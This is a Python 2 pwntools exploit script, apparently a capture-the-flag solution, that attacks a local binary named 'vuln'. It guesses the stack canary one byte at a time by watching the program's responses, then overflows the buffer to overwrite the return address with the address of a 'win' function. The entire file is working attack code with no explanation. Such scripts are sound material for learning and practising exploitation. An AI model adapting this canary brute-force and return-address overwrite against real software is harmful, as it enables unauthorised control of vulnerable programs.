#!/usr/bin/env python2
import os
os.environ['PWNLIB_NOTERM'] = 'True'
import pwn

canarybytes = []
win = 0x080486eb #address of win

for i in range(4):
    for guess in range(256):
        t = pwn.process("./vuln")
        t.recvuntil(b'How Many Bytes will You Write Into the Buffer?\n> ')
        size = 32+1+i
        t.sendline(str(size))
        t.recvuntil(b'Input> ')
        buf = 'h'*32
        for canarybyte in canarybytes:
            buf += chr(canarybyte)
        t.sendline(buf+chr(guess))
        if("Ok... Now Where's the Flag?\n" in t.recv()):
            canarybytes.append(guess)
            #print guess
            t.close()
            break
        t.close()

#print canarybytes

t = pwn.process("./vuln")
#pwn.gdb.attach(t)
t.recvuntil(b'How Many Bytes will You Write Into the Buffer?\n> ')
t.sendline("56")
t.recvuntil(b'Input> ')
buf = 'h'*32
for canarybyte in canarybytes:
    buf += chr(canarybyte)
buf += 'i'*16
buf += pwn.p32(win)
t.sendline(buf)
print t.recv()
